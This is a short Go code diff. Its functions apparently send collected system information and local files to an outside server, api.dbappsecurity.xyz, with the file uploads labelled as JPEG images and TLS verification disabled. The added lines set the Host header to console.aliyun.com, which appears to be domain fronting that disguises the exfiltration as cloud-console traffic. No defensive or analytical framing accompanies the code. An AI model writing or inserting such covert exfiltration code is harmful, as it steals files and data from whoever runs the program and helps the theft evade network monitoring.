@@ -36,6 +36,7 @@ func inforev() {
 	req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/service", bytes.NewBuffer(jstr))
 	req.Header.Add("Content-Type", "application/json;charset=utf-8")
 	//req.Header.Add("X-Forwarded-For", ip)
+	req.Host = "console.aliyun.com"
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -68,6 +69,7 @@ func uploadfiles(filenames []string) {
 			Timeout:   1 * time.Second,
 		}
 		req, _ := http.NewRequest("POST", "https://api.dbappsecurity.xyz/ms", file)
+		req.Host = "console.aliyun.com"
 		req.Header.Set("Content-Type", "image/jpeg")
 		_, err = client.Do(req)
 		if err != nil {
